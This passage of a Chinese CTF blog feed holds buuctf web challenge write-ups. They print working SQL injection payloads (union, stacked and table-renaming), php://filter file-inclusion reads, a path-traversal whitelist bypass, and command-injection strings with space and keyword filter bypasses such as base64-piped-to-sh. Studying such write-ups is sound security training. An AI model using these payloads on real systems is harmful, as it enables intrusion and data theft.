    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
    <category term="PHP绕过" scheme="http://example.com/tags/PHP%E7%BB%95%E8%BF%87/"/>
    
    <category term="MYSQL比较特性" scheme="http://example.com/tags/MYSQL%E6%AF%94%E8%BE%83%E7%89%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>buuctf_web_2</title>
    <link href="http://example.com/2021/05/11/buuctf/buuctf-web-2/"/>
    <id>http://example.com/2021/05/11/buuctf/buuctf-web-2/</id>
    <published>2021-05-11T13:48:20.000Z</published>
    <updated>2021-05-23T11:06:14.890Z</updated>
    
    <content type="html"><![CDATA[<p>[SUCTF 2019]EasySQL</p><p>[ACTF2020 新生赛]Include</p><p>[极客大挑战 2019]LoveSQL</p><span id="more"></span><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a><strong>[SUCTF 2019]EasySQL</strong></h3><p>输入1，正常回显，有值</p><p><img src="https://ae01.alicdn.com/kf/Uf7e9dad7044b46d48dbe1278f39a36c9x.jpg"></p><p>1’无回显</p><p><img src="https://ae01.alicdn.com/kf/U6b484c85894c4abca2ded21397f1c9b7d.jpg"></p><p>1”报错，nonono</p><p><img src="https://ae01.alicdn.com/kf/Ua42f5a0e49b4410ba51eca7125e7e1094.jpg"></p><p>有三个回显。</p><p>试试1’and ‘1’=’1，报nonono</p><p><img src="https://ae01.alicdn.com/kf/U62b61a0df2924b17807d997e5f817ed7G.jpg"></p><p><img src="https://ae01.alicdn.com/kf/U5816be4bed6643a58af0eb13547a7a378.jpg"></p><p>试了order by也不行，试试堆叠注入;show databases;#</p><p><img src="https://ae01.alicdn.com/kf/Udc7b0f6022934ae98ade53f41bdd2f0dp.jpg"></p><p>接下来;show tables;#</p><p><img src="https://ae01.alicdn.com/kf/Uae53a39e5b604f109d0fb4c3680875eal.jpg"></p><p>怎么查看Flag呢。。。。</p><p>查看大佬们的wp，</p><p>输入1显示Array ( [0] =&gt; 1 )</p><p>输入a显示空白</p><p>输入所有非0数字都显示Array ( [0] =&gt; 1 )</p><p>输入所有字母（除过滤的关键词外）都显示空白</p><p>可以推测题目应该是用了||符号。</p><p>推测出题目应该SQL语句是select $_post[value] || flag from Flag。</p><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。</p><p>出现了<strong>非预期解</strong></p><p>*,1，构造成select *,1 || flag from flag</p><p>官方解</p><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p>构造成select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag，</p><p>其中PIPES_AS_CONCAT能将||视为字符串连接符而非或运算符，</p><p>实际运行为select 1;set sql_mode=PIPES_AS_CONCAT;select “1”+flag from Flag</p><h3 id="ACTF2020-新生赛-Include-1"><a href="#ACTF2020-新生赛-Include-1" class="headerlink" title="[ACTF2020 新生赛]Include 1"></a><strong>[ACTF2020 新生赛]Include</strong> <strong>1</strong></h3><p>很简单的一个文件包含，直接用php伪协议读取flag.php即可</p><p><img src="https://ae01.alicdn.com/kf/U761a1cffd04b4ff8b6c48229f39a05e0g.jpg"></p><p><img src="https://ae01.alicdn.com/kf/Ud42d716bcc904604a29b43a3408cdf52a.jpg"></p><h3 id="极客大挑战-2019-LoveSQL-1"><a href="#极客大挑战-2019-LoveSQL-1" class="headerlink" title="[极客大挑战 2019]LoveSQL 1"></a><strong>[极客大挑战 2019]LoveSQL</strong> <strong>1</strong></h3><p>是个登陆界面</p><p>直接试试万能密码</p><p>username=1’ or 1=1#passwd=1</p><p><img src="https://ae01.alicdn.com/kf/Udfa9e2c9aee2402a8bbb91f2426d60ebd.jpg"> </p><p>使用admin登录</p><p>登录之后还是和上面一样的界面</p><p><img src="https://ae01.alicdn.com/kf/U1b7d3b03fbbf4a4bb2e2a4f423ba1910e.jpg"> </p><p>bp抓包试试sql注入</p><p>经测试发现单引号可以闭合</p><p><img src="https://ae01.alicdn.com/kf/U20fb61b2fb834147848724f7df553920a.jpg"> </p><p>并且他是有三列</p><p>直接注，爆库</p><p>?username=-1’+union+select+1,version(),database()%23&amp;password=49015dfe2bc6add029ba98b1613a2493</p><p><img src="https://ae01.alicdn.com/kf/U5726ac4cde5b434eae6aa76e87295414y.jpg"> </p><p>爆表</p><p>username=-1’+union+select+1,version(),group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23&amp;password=49015dfe2bc6add029ba98b1613a2493</p><p><img src="https://ae01.alicdn.com/kf/U5e10f6820c3344359e60d8e018dbc085U.jpg"> </p><p>爆列</p><p>username=-1’+union+select+1,version(),group_concat(column_name)+from+information_schema.columns+where+table_name=’l0ve1ysq1’%23&amp;password=49015dfe2bc6add029ba98b1613a2493</p><p><img src="https://ae01.alicdn.com/kf/U660285d178f84fde92644bf44a61428ab.jpg"> </p><p>爆数据</p><p>username=-1’+union+select+1,version(),group_concat(username,’-‘,password)+from+l0ve1ysq1%23&amp;password=49015dfe2bc6add029ba98b1613a2493</p><p><img src="https://ae01.alicdn.com/kf/U1ce49c616a8b45bf86c395a73660f927G.jpg"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[SUCTF 2019]EasySQL&lt;/p&gt;
&lt;p&gt;[ACTF2020 新生赛]Include&lt;/p&gt;
&lt;p&gt;[极客大挑战 2019]LoveSQL&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
    <category term="SQLi" scheme="http://example.com/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>buuctf_web_1</title>
    <link href="http://example.com/2020/08/19/buuctf/buuctf-web-1/"/>
    <id>http://example.com/2020/08/19/buuctf/buuctf-web-1/</id>
    <published>2020-08-19T11:52:51.000Z</published>
    <updated>2021-05-23T11:06:23.122Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    学如逆水行舟，不进则退</p><span id="more"></span><p>[HCTF 2018]WarmUp<br>[强网杯 2019]随便注<br>[极客大挑战 2019]EasySQL1<br>[极客大挑战 2019]Havefun<br>[极客大挑战 2019]Secret File<br> [GXYCTF2019]Ping Ping Ping<br>[ACTF2020 新生赛]Exec 1<br>[RoarCTF 2019]Easy Calc 1<br>[极客大挑战 2019]PHP 1<br>[极客大挑战 2019]Http 1<br>[极客大挑战 2019]Upload 1<br>[极客大挑战 2019]BabySQL 1<br>[HCTF 2018]admin1<br>[ACTF2020 新生赛]Upload1<br>[ACTF2020 新生赛]BackupFile1<br>[SUCTF 2019]CheckIn1</p><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>打开source.php后，得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//in_array()查找字符串中是否存在指定的值</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(<span class="variable">$page</span>, <span class="number">0</span> ,mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">             <span class="comment">//mb_substr(str,0,2)函数返回字符串的一部分</span></span><br><span class="line">             <span class="comment">//mb_strpos(str1,str2)返回str2在str1中首次出现的位置</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(<span class="variable">$_page</span>, <span class="number">0</span> ,mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里面又有一个hint.php，打开之后只有一句话。<code>flag not here, and flag in ffffllllaaaagggg</code>。</p><p>看来是要想办法读取到ffffllllaaaagggg的内容，来拿到flag。</p><p>先看看下面的主函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p><code>if (! empty($_REQUEST[&#39;file&#39;])&amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</code>中要求<code>emmm::checkFile($_REQUEST[&#39;file&#39;]</code>返回true，只要能返回true，就能<code>include $_REQUEST[&#39;file&#39;];</code>。</p><p>来看看emmm::checkFile($_REQUEST[‘file’]函数，在这个函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123; <span class="comment">//in_array()查找字符串中是否存在指定的值</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>whitelist是个白名单，只允许source.php和hint.php。这个if判断，会判断参数中是否含有source.php和hint.php。如果存在则返回true，如果失败则执行下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(<span class="variable">$page</span>, <span class="number">0</span> ,mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">                               <span class="comment">//mb_substr(str,0,2)函数返回字符串的一部分</span></span><br><span class="line">                               <span class="comment">//mb_strpos(str1,str2)返回str2在str1中首次出现的位置</span></span><br></pre></td></tr></table></figure><p>这段代码，首先会通过mb_strpos()函数返回在page中<code>?</code>第一次出现的位置，然后通过mb_substr()函数截取这一部分的字符串，赋值给_page。然后再进入新一轮的if判断,此时_page如果是白名单中的字符串，返回true，如果还没有，则再通过urldecode()解码以及再次进行截取，进入if判断，成功返回true。</p><p>可以发现，这里有两个if都能返回true，我们只需要满足一处if条件，然后返回true，就可以利用 <code>../</code> 来穿越目录读取到我们想要的文件。</p><p><strong>第一处</strong></p><p>构造<code>?file=source.php?../../../../../../../../../../ffffllllaaaagggg</code>，经过mb_substr()时，就会只剩source.php，就会返回true，然后通过../即可穿越目录读取flag</p><p><strong>第二处</strong></p><p>第二处是在经过urldecode()解码之后再返回true，这样的话需要将<code>?</code>进行两次url编码，</p><p><code>?file=source.php%25%33%46/../../../../../../ffffllllaaaagggg</code></p><p>这样传入浏览器解码一次，<code>?file=source.php%3F/../../../../../../ffffllllaaaagggg</code></p><p>urldecode()再解码一次，<code>?file=source.php?/../../../../../../ffffllllaaaagggg</code></p><p>再经过截取，即可如上面一样，返回true。</p><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>作为一个彩笔，这题触及我的知识盲区了。</p><p>开始的时候还是很愉快的，就SQL注入的老套路，<code>1&#39; order by 2#</code>猜出两列之后，上<code>1&#39; union select 1,database()#</code>之后，出现了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>，过滤了很多这么多关键字，大写、双写也不行。网上找了找wp。</p><p>原来是堆叠注入</p><p>原理</p><p> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ;  结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union  injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union  all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM  products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where  productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p><p> 0’;show databases;# </p><p> 0’;show tables;# </p><p> 0’;show columns from words;# </p><p> 查<code>询1919810931114514</code>表中所有列<br>1’;show columns from <code>1919810931114514</code>;#(字符串为表名操作时要加反引号) </p><p> 根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id<br><strong>方法一(修改数据库结构):</strong><br>这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag<br>将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br></pre></td></tr></table></figure><p> 这段代码的意思是将<code>words</code>表名改为<code>words1</code>，<code>1919810931114514</code>表名改为<code>words</code>，将现在的<code>words</code>表中的<code>flag</code>列名改为<code>id</code><br>然后用<code>1&#39; or 1=1 #</code>得到flag </p><h3 id="极客大挑战-2019-EasySQL1"><a href="#极客大挑战-2019-EasySQL1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h3><p>使用万能密码即可得到flag，<code>username=1&#39; or 1#&amp;password=1</code></p><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $cat=$_GET[&#x27;cat&#x27;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat==&#x27;dog&#x27;)&#123;</span><br><span class="line">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>提交<code>?cat=dog</code>，即可。</p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>经过一系列的页面跳转，抓包，得到secret3.php，在里面得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这段代码中没有过滤php://，并且提示flag在flag.php中，所以使用php伪协议读取<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>得到base64解码即可。</p><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202201824877.png" alt="image-20201202201824877"></p><p>试试ip，正常回显</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202202154220.png" alt="image-20201202202154220"></p><p>试试命令执行</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202202237785.png" alt="image-20201202202237785"></p><p>查看flag.php</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202223029487.png" alt="image-20201202223029487"></p><p> 猜测是空格被过滤了<br> 用$IFS$1代替 </p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202223258355.png" alt="image-20201202223258355"></p><p>查看index.php</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202223345593.png" alt="image-20201202223345593"></p><p>可以看到过滤了很多字符</p><p> 但是在最后我们看到了a变量，那我们是不是可以将a的值覆盖，然后进行绕过呢？ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>查看源码即可</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202224040703.png" alt="image-20201202224040703"></p><p>还可以对cat flag.php进行编码</p><p>构造payload<br>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p><p><strong>知识点1：空格绕过</strong></p><p>处理方法：1.全局变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.$&#123;IFS&#125;</span><br><span class="line">2.$IFS$1 #注释：最后一句的意识是取第几个参数的意思，当没有参数的时候，就不用考虑</span><br><span class="line">3.重定向符：&lt;&gt;</span><br><span class="line">4.定义变量#cmd=$&#x27;\x201234&#x27;&amp;&amp;echo$cmd  这个方式可以用ASCII编码，绕过所有字符限制。</span><br><span class="line">5.&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br></pre></td></tr></table></figure><p><strong>知识点2：过滤字符了链接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo ()|base64 -d|sh</span><br><span class="line">echo ()| base64 -d|bash</span><br><span class="line">`echo ()|base64 -d&#x27;</span><br><span class="line">变量拼接a=l;b=s;$a$b</span><br><span class="line">*贪婪匹配</span><br><span class="line">反斜杠绕过 echo f\lag.php</span><br><span class="line">编码绕过</span><br><span class="line">  $(printf &quot;\154\163&quot;) ==&gt;ls</span><br><span class="line">  $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag</span><br><span class="line">  &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</span><br><span class="line"> 特殊变量 1; l$@s -l;1 · 1; l$*s -l;1 1; l$ns -l;1 //n为任意数字都可以</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h3><p>很简单的命令执行</p><p>|ls</p><p>|cat flag即可</p><h3 id="极客大挑战-2019-Knife-1"><a href="#极客大挑战-2019-Knife-1" class="headerlink" title="[极客大挑战 2019]Knife 1"></a>[极客大挑战 2019]Knife 1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202230350501.png" alt="image-20201202230350501"></p><p>直接上菜刀连接，在根目录下有flag</p><h3 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc 1"></a>[RoarCTF 2019]Easy Calc 1</h3><p>算了一下，</p><p>试了试||、&amp;&amp;、|、&amp;、;   都不行，看看源码</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204210320229.png" alt="image-20201204210320229"></p><p>说是有waf，</p><p>$(“#content”).val()<br>获取id为content的HTML标签元素的值,是JQuery<br>$(“#content”)<br>同document.getElementById(“content”);<br>$(“#content”).val()<br>同document.getElementById(“content”).value;</p><p>但是看到了calc.php，访问一下</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204210419176.png" alt="image-20201204210419176"></p><p>加上num试试</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204211624621.png" alt="image-20201204211624621"></p><p>url编码之后才行</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204211649123.png" alt="image-20201204211649123"></p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204211720604.png" alt="image-20201204211720604"></p><p>但是，一输入特殊字符就forbidden，应该是waf</p><p>可是我们不知道waf如何写的，，该如何绕过呢？？<br>其实利用PHP的字符串解析特性就能够进行绕过waf！！<br>构造参数? num=phpinfo()（注意num前面有个空格）就能够绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=phpinfo()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204222836272.png" alt="image-20201204222836272"></p><p>由于“/”被过滤了，，，所以我们可以使用chr(47)来进行表示，进行目录读取：</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204223354547.png" alt="image-20201204223354547"></p><p>读取flag</p><p>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204223533883.png" alt="image-20201204223533883"></p><h3 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205194600014.png" alt="image-20201205194600014"></p><p>备份网站？是暗示吗？</p><p>扫一下网站目录试试</p><p>python3 dirsearch.py -u <a href="http://9743478f-8031-45e4-9f2d-9643a2105dc9.node3.buuoj.cn/">http://9743478f-8031-45e4-9f2d-9643a2105dc9.node3.buuoj.cn/</a> -e *</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205212413049.png" alt="image-20201205212413049"></p><p>访问试试<a href="http://www.zip试试,拿到源码/">www.zip试试，拿到源码</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">   <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">   <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要get提交select，然后反序列化</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 